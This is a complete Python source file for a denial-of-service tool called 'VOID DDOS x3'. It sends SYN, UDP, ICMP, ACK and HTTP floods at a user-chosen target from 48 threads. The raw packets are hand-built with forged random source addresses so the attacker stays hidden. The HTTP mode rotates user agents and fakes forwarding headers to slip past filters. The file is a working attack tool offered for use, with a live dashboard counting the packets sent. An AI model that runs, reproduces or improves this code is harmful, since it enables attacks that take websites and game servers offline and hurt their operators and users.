#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID DDOS × 3 — NO LAG EDITION
# ##  CPU-friendly · Still powerful · @lfw.k4rma_
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet")]:
        try: __import__(mod)
        except ImportError:
            try:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q",
                    "--break-system-packages"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q"],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

_ensure_deps()

import struct, socket, random, threading, time, re, select, ctypes, signal
import multiprocessing as mp
from rich.console import Console
from rich.text    import Text
from rich.align   import Align
from rich.rule    import Rule
from rich.panel   import Panel
from rich.table   import Table
from rich.live    import Live
from rich         import box
import pyfiglet

console    = Console()

# ══════════════════════════════════════════════════════════════════
# CONFIG — REDUCED FOR NO LAG
# ══════════════════════════════════════════════════════════════════
N_INSTANCES  = 3
N_THREADS    = 16           # REDUCED: 16 per instance (48 total) vs 64 (192)
POOL_SIZE    = 2000
BATCH_REPORT = 500          # INCREASED: less lock contention
BUF_SIZE     = 4 * 1024 * 1024  # REDUCED: 4MB vs 8MB
YIELD_EVERY  = 100          # Yield CPU every 100 packets
SLEEP_TIME   = 0.001        # 1ms sleep to prevent CPU saturation

# ══════════════════════════════════════════════════════════════════
# BYPASS HEADERS
# ══════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1",
]

# ══════════════════════════════════════════════════════════════════
# PACKET ENGINE
# ══════════════════════════════════════════════════════════════════

def _checksum(data):
    if len(data) % 2: data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i+1]
    s = (s >> 16) + (s & 0xffff); s += s >> 16
    return ~s & 0xffff

F_SYN=0x002; F_ACK=0x010; F_RST=0x004; F_FIN=0x001; F_PSH=0x008

def _rand_ip():
    while True:
        a = random.choice([1,2,3,4,5,8,9,14,17,18,23,24,25,26,28,32,33,34,35,38,40,41,44,45,46,47,48,50,52,54,55,56])
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        ip = f"{a}.{b}.{c}.{d}"
        try:
            socket.inet_aton(ip)
            return ip
        except:
            continue

def _rand_port():
    return random.randint(1024, 65535)

def _ip_header(src,dst,proto,plen):
    sid=random.randint(0,65535)
    ttl=random.randint(64, 128)
    try:
        s=socket.inet_aton(src)
        d=socket.inet_aton(dst)
    except:
        s=socket.inet_aton("1.2.3.4")
        d=socket.inet_aton(dst)
    h=struct.pack('!BBHHHBBH4s4s',(4<<4)|5,0,20+plen,sid,0,ttl,proto,0,s,d)
    return struct.pack('!BBHHHBBH4s4s',(4<<4)|5,0,20+plen,sid,0,ttl,proto,_checksum(h),s,d)

def _tcp_seg(si,di,sp,dp,flags):
    seq=random.randint(0,2**32-1)
    win=random.randint(1024, 65535)
    off=(5<<4)|0
    seg=struct.pack('!HHIIBBHHH',sp,dp,seq,0,off,flags,win,0,0)
    try:
        ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,6,len(seg))
    except:
        ps=struct.pack('!4s4sBBH',socket.inet_aton("1.2.3.4"),socket.inet_aton(di),0,6,len(seg))
    chk=_checksum(ps+seg)
    return struct.pack('!HHIIBBHHH',sp,dp,seq,0,off,flags,win,chk,0)

def _udp_seg(si,di,sp,dp):
    data=random.randbytes(random.randint(64, 512))
    ln=8+len(data)
    seg=struct.pack('!HHHH',sp,dp,ln,0)+data
    try:
        ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,17,ln)
    except:
        ps=struct.pack('!4s4sBBH',socket.inet_aton("1.2.3.4"),socket.inet_aton(di),0,17,ln)
    chk=_checksum(ps+seg[:8]+data)
    return struct.pack('!HHHH',sp,dp,ln,chk)+data

def _icmp():
    id_=random.randint(0,65535)
    seq=random.randint(0,65535)
    pay=random.randbytes(random.randint(56, 200))
    h=struct.pack('!BBHHH',8,0,0,id_,seq)
    return struct.pack('!BBHHH',8,0,_checksum(h+pay),id_,seq)+pay

def _build_pkt(mk,si,di,sp,dp):
    if mk=="SYN":
        t=_tcp_seg(si,di,sp,dp,F_SYN)
        return _ip_header(si,di,6,len(t))+t
    elif mk=="ACK":
        t=_tcp_seg(si,di,sp,dp,F_ACK)
        return _ip_header(si,di,6,len(t))+t
    elif mk=="UDP":
        u=_udp_seg(si,di,sp,dp)
        return _ip_header(si,di,17,len(u))+u
    elif mk=="ICMP":
        ic=_icmp()
        return _ip_header(si,di,1,len(ic))+ic
    return b''

def _build_pool(mk,tip,tport,size,real_src=None):
    pool=[]
    for _ in range(size):
        if real_src:
            pool.append(_build_pkt(mk,real_src,tip,_rand_port(),tport))
        else:
            pool.append(_build_pkt(mk,_rand_ip(),tip,_rand_port(),tport))
    return pool

# ══════════════════════════════════════════════════════════════════
# WORKERS — OPTIMIZED FOR NO LAG
# ══════════════════════════════════════════════════════════════════

def _http_worker(tip, tport, sent_v, replies_v, errors_v, stop_v):
    """HTTP flood — connection reuse for efficiency"""
    paths=["/","/index.html","/api","/login","/home","/search","/admin","/robots.txt"]
    
    while not stop_v.value:
        s=None
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((tip,tport))
            
            # Send multiple requests per connection
            for _ in range(5):
                if stop_v.value:
                    break
                req=(
                    f"GET {random.choice(paths)} HTTP/1.1\r\n"
                    f"Host: {tip}:{tport}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"X-Forwarded-For: {_rand_ip()}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                
                s.sendall(req)
                with sent_v.get_lock(): sent_v.value += 1
                
                try:
                    if s.recv(1024):
                        with replies_v.get_lock(): replies_v.value += 1
                except: pass
                
                # Yield CPU
                time.sleep(SLEEP_TIME)
                
        except Exception:
            with errors_v.get_lock(): errors_v.value += 1
        finally:
            if s:
                try: s.close()
                except: pass
            time.sleep(0.005)

def _raw_sender(tip, tport, mk, sent_v, errors_v, stop_v, real_src=None):
    """Raw sender — blocking mode with yield"""
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,BUF_SIZE)
        # BLOCKING mode with timeout — no busy waiting
        sock.setblocking(True)
        sock.settimeout(0.1)
        
        pool=_build_pool(mk,tip,tport,POOL_SIZE,real_src)
        idx=0
        batch=0
        total=0
        
        while not stop_v.value:
            try:
                sock.sendto(pool[idx],(tip,0))
                idx=(idx+1)%POOL_SIZE
                batch+=1
                total+=1
                
                if batch>=BATCH_REPORT:
                    with sent_v.get_lock(): sent_v.value+=batch
                    batch=0
                
                if total%(POOL_SIZE*10)==0:
                    pool=_build_pool(mk,tip,tport,POOL_SIZE,real_src)
                    idx=0
                
                # Yield CPU every N packets
                if total%YIELD_EVERY==0:
                    time.sleep(SLEEP_TIME)
                    
            except socket.timeout:
                continue
            except BlockingIOError:
                if batch:
                    with sent_v.get_lock(): sent_v.value+=batch
                    batch=0
                time.sleep(0.001)
            except Exception:
                with errors_v.get_lock(): errors_v.value+=1
                
        if batch:
            with sent_v.get_lock(): sent_v.value+=batch
        sock.close()
    except PermissionError:
        print(f"[Instance] Need root")
        stop_v.value=1
    except Exception:
        with errors_v.get_lock(): errors_v.value+=1

def _raw_listener(tip, tport, mk, replies_v, stop_v, attacker_ip):
    """Listener — lower CPU usage"""
    try:
        if mk in ("SYN","ACK"):
            proto=socket.IPPROTO_TCP
        else:
            proto=socket.IPPROTO_ICMP
            
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,proto)
        sock.setblocking(False)
        
        while not stop_v.value:
            try:
                # Longer timeout = less CPU
                ready,_,_=select.select([sock],[],[],0.05)
                if not ready:
                    continue
                
                pkt,addr=sock.recvfrom(65535)
                if addr[0] in ("127.0.0.1","0.0.0.0"):
                    continue
                
                if proto==socket.IPPROTO_TCP:
                    ihl=(pkt[0]&0x0f)*4
                    if len(pkt)<ihl+20:
                        continue
                    tcph=struct.unpack('!HHIIBBHHH',pkt[ihl:ihl+20])
                    if tcph[0]==tport:
                        with replies_v.get_lock(): replies_v.value+=1
                else:
                    ihl=(pkt[0]&0x0f)*4
                    if len(pkt)<ihl+1:
                        continue
                    if pkt[ihl] in (0,3,11):
                        with replies_v.get_lock(): replies_v.value+=1
                        
            except BlockingIOError:
                continue
            except Exception:
                continue
        sock.close()
    except Exception:
        pass

def worker_main(instance_id, tip, tport, mk, sent_v, replies_v, errors_v, stop_v, use_spoof, attacker_ip):
    """Worker — clean setup"""
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    
    threads=[]
    
    if mk=="HTTP":
        for _ in range(N_THREADS):
            t=threading.Thread(target=_http_worker,
                args=(tip,tport,sent_v,replies_v,errors_v,stop_v),daemon=True)
            t.start()
            threads.append(t)
    else:
        real_src=None if use_spoof else attacker_ip
        
        for _ in range(N_THREADS):
            t=threading.Thread(target=_raw_sender,
                args=(tip,tport,mk,sent_v,errors_v,stop_v,real_src),daemon=True)
            t.start()
            threads.append(t)
        
        if not use_spoof:
            lt=threading.Thread(target=_raw_listener,
                args=(tip,tport,mk,replies_v,stop_v,attacker_ip),daemon=True)
            lt.start()
            threads.append(lt)
    
    try:
        while not stop_v.value:
            time.sleep(0.2)
    except:
        pass
    
    for t in threads:
        t.join(timeout=1.0)

# ══════════════════════════════════════════════════════════════════
# UI
# ══════════════════════════════════════════════════════════════════

def _bar(ratio, width=22, col="bright_red"):
    filled=max(0,min(int(ratio*width),width))
    b=Text(); b.append("█"*filled,style=col); b.append("░"*(width-filled),style="dim")
    return b

def banner():
    console.clear()
    fig=pyfiglet.figlet_format("VOID  x3",font="doom")
    txt=Text()
    for i,line in enumerate(fig.splitlines()):
        txt.append(line+"\n",style="bright_red" if i%2==0 else "red")
    console.print(Align.center(txt))
    console.print(Align.center(Text(
        "no-lag edition · 3 processes · 48 threads · @lfw.k4rma_\n",style="dim red")))
    console.print(Rule(style="bright_red"))

MODES = {
    "1": {"label":"SYN Flood",  "key":"SYN",  "color":"bright_red"},
    "2": {"label":"UDP Flood",  "key":"UDP",  "color":"bright_cyan"},
    "3": {"label":"ICMP Flood", "key":"ICMP", "color":"yellow"},
    "4": {"label":"ACK Flood",  "key":"ACK",  "color":"bright_magenta"},
    "5": {"label":"HTTP Flood",  "key":"HTTP", "color":"bright_green"},
}

def resolve(target):
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$",target):
        return target
    try:
        ip=socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/] [bold yellow]{target}[/] → [white]{ip}[/]")
        return ip
    except Exception:
        return target

def get_local_ip():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80))
        ip=s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.0"

# ══════════════════════════════════════════════════════════════════
# MAIN — OPTIMIZED
# ══════════════════════════════════════════════════════════════════

def main():
    if os.geteuid()!=0:
        banner()
        console.print("\n  [bold red][!][/]  Raw sockets need root — run with sudo\n")
        return

    banner()
    console.print()

    console.print("  [bright_red]◈[/]  ",end="")
    raw_t=input("Target IP or hostname: ").strip()
    if not raw_t:
        console.print("  [red]No target.[/]")
        return
    raw_t=re.sub(r'^https?://','',raw_t).split('/')[0].split(':')[0]
    tip=resolve(raw_t)

    console.print("  [bright_red]◈[/]  ",end="")
    port_raw=input("Port (80/443/25565): ").strip()
    tport=int(port_raw) if port_raw.isdigit() else 80

    console.print()
    for k,m in MODES.items():
        console.print(f"  [bright_red][{k}][/]  [bold {m['color']}]{m['label']}[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ",end="")
    choice=input("Mode (1-5, default 1): ").strip()
    mode=MODES.get(choice,MODES["1"])

    attacker_ip=get_local_ip()
    
    use_spoof=True
    if mode["key"]!="HTTP":
        console.print()
        console.print(f"  [dim]Your IP: {attacker_ip}[/]")
        console.print("  [bright_red]◈[/]  ",end="")
        spoof=input("Use IP spoofing? (Y=Stealth/No replies, N=See replies) [Y/n]: ").strip().lower()
        use_spoof=(spoof!="n" and spoof!="no")
        
        if use_spoof:
            console.print("  [dim red]Stealth mode: Replies hidden[/]")
        else:
            console.print(f"  [dim green]Reply mode: Using {attacker_ip}[/]")

    console.print()
    console.print(Rule("[dim red]  CONFIRM  [/]",style="dim red"))
    console.print(f"  [dim]Target   [/] [bold yellow]{tip}:{tport}[/]")
    console.print(f"  [dim]Mode     [/] [bold {mode['color']}]{mode['label']}[/]")
    if mode["key"]!="HTTP":
        console.print(f"  [dim]Spoofing [/] [bold {'red' if use_spoof else 'green'}]{'ON' if use_spoof else 'OFF'}[/]")
    console.print(f"  [dim]Engine   [/] [bold white]{N_INSTANCES} processes × {N_THREADS} threads = {N_INSTANCES*N_THREADS} total[/]")
    console.print(f"  [dim]Lag      [/] [bold green]MINIMAL[/]  [dim](CPU-friendly)[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ",end="")
    if input("Start? (Y/N): ").strip().lower() not in ("y","yes"):
        console.print("\n  [yellow]Aborted.[/]\n")
        return

    mk=mode["key"]; col=mode["color"]; label=mode["label"]

    sent_v    = [mp.Value(ctypes.c_uint64,0) for _ in range(N_INSTANCES)]
    replies_v = [mp.Value(ctypes.c_uint64,0) for _ in range(N_INSTANCES)]
    errors_v  = [mp.Value(ctypes.c_uint64,0) for _ in range(N_INSTANCES)]
    stop_val  = mp.Value(ctypes.c_int, 0)

    console.print()
    for i in range(3,0,-1):
        console.print(f"\r  [bold bright_red][!][/]  [white]Launching in [bright_red]{i}[/]...[/]",end="")
        time.sleep(1)
    mode_str='STEALTH' if use_spoof else 'REPLY'
    console.print(f"\r  [bold bright_red][!!!][/]  [bright_red]FIRING — {N_INSTANCES*N_THREADS} THREADS — NO-LAG {mode_str} MODE              [/]")
    console.print()

    procs=[]
    for i in range(N_INSTANCES):
        p=mp.Process(
            target=worker_main,
            args=(i,tip,tport,mk,sent_v[i],replies_v[i],errors_v[i],stop_val,use_spoof,attacker_ip),
            daemon=True)
        p.start()
        procs.append(p)

    start=time.time()
    last_sent=[0]*N_INSTANCES
    last_replies=[0]*N_INSTANCES
    last_t=time.time()

    try:
        from rich.console import Group
        # LOWER refresh rate (2/sec) = less CPU
        with Live(console=console,refresh_per_second=2,screen=False) as live:
            while True:
                now=time.time(); dt=max(now-last_t,0.001); last_t=now
                snaps=[{"sent":sent_v[i].value,"replies":replies_v[i].value,"errors":errors_v[i].value} for i in range(N_INSTANCES)]

                pps_each=[]; rps_each=[]
                for i,s in enumerate(snaps):
                    pps_each.append((s["sent"]-last_sent[i])/dt)
                    rps_each.append((s["replies"]-last_replies[i])/dt)
                    last_sent[i]=s["sent"]
                    last_replies[i]=s["replies"]

                total_sent=sum(s["sent"] for s in snaps)
                total_replies=sum(s["replies"] for s in snaps)
                total_pps=sum(pps_each)
                total_rps=sum(rps_each)
                elap=now-start

                inst_tbl=Table.grid(padding=(0,2))
                inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column()
                inst_tbl.add_row(
                    Text("INST",style="dim"),Text("SENT",style="dim"),Text("REPLIES",style="dim"),
                    Text("PPS",style="dim"),Text("RPS",style="dim"),Text("ERRORS",style="dim")
                )
                for i,s in enumerate(snaps):
                    inst_tbl.add_row(
                        Text(f"#{i+1}",style="bold bright_red"),
                        Text(f"{s['sent']:,}",style="bold white"),
                        Text(f"{s['replies']:,}",style="bold bright_green"),
                        Text(f"{pps_each[i]:,.0f}",style=f"bold {col}"),
                        Text(f"{rps_each[i]:,.0f}",style="bold bright_green"),
                        Text(f"{s['errors']:,}",style="dim red")
                    )

                comb_tbl=Table.grid(padding=(0,2))
                comb_tbl.add_column();comb_tbl.add_column();comb_tbl.add_column();comb_tbl.add_column()
                comb_tbl.add_row(
                    Text("TOTAL SENT",style="dim"),Text(f"{total_sent:,}",style="bold white"),
                    Text("TOTAL REPLIES",style="dim"),Text(f"{total_replies:,}",style="bold bright_green")
                )
                comb_tbl.add_row(
                    Text("COMBINED PPS",style="dim"),Text(f"{total_pps:,.0f}",style=f"bold {col}"),
                    Text("COMBINED RPS",style="dim"),Text(f"{total_rps:,.0f}",style="bold bright_green")
                )
                comb_tbl.add_row(
                    Text("MODE",style="dim"),Text(f"{'STEALTH' if use_spoof else 'REPLY'}",style=f"bold {'red' if use_spoof else 'green'}"),
                    Text("UPTIME",style="dim"),Text(f"{elap:.0f}s",style="bold white")
                )

                rate_bar=Text()
                rate_bar.append("  RATE  ",style="bold white")
                rate_bar.append_text(_bar(min(total_pps/100000,1.0),col=col))
                rate_bar.append(f"  {total_pps:,.0f} pps",style=f"bold {col}")

                reply_bar=Text()
                reply_bar.append("  REPLY ",style="bold white")
                reply_bar.append_text(_bar(min(total_rps/10000,1.0),col="bright_green"))
                reply_bar.append(f"  {total_rps:,.0f} rps",style="bold bright_green")

                panel=Panel(
                    Group(inst_tbl,Text(""),Rule("[dim red]COMBINED[/]",style="dim red"),Text(""),
                          comb_tbl,Text(""),rate_bar,reply_bar,Text(""),
                          Text("  Ctrl+C to halt",style="dim red")),
                    title=f"[bold bright_red]  VOID DDOS × {N_INSTANCES}  —  NO-LAG MODE  [/]",
                    border_style="bright_red",
                    box=box.DOUBLE_EDGE
                )
                live.update(panel)
                time.sleep(0.5)  # 0.5s sleep = 2 updates/sec

    except KeyboardInterrupt:
        pass

    stop_val.value=1
    for p in procs:
        p.join(timeout=2.0)

    total_sent=sum(sent_v[i].value for i in range(N_INSTANCES))
    total_replies=sum(replies_v[i].value for i in range(N_INSTANCES))
    elap=time.time()-start

    console.print()
    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]",style="bright_red"))
    console.print(f"  [dim]Target         [/] [bold yellow]{tip}:{tport}[/]")
    console.print(f"  [dim]Mode           [/] [bold {col}]{label}[/]")
    console.print(f"  [dim]Spoofing       [/] [bold {'red' if use_spoof else 'green'}]{'ON' if use_spoof else 'OFF'}[/]")
    console.print(f"  [dim]Total sent     [/] [bold white]{total_sent:,}[/]")
    console.print(f"  [dim]Total replies  [/] [bold white]{total_replies:,}[/]")
    console.print(f"  [dim]Duration       [/] [bold white]{elap:.1f}s[/]")
    if elap>0:
        console.print(f"  [dim]Avg PPS        [/] [bold white]{total_sent/elap:,.0f}[/]")
        console.print(f"  [dim]Avg RPS        [/] [bold white]{total_replies/elap:,.0f}[/]")
    console.print()
    console.print(Rule(style="bright_red"))

if __name__=="__main__":
    mp.set_start_method("fork")
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  {e}\n")
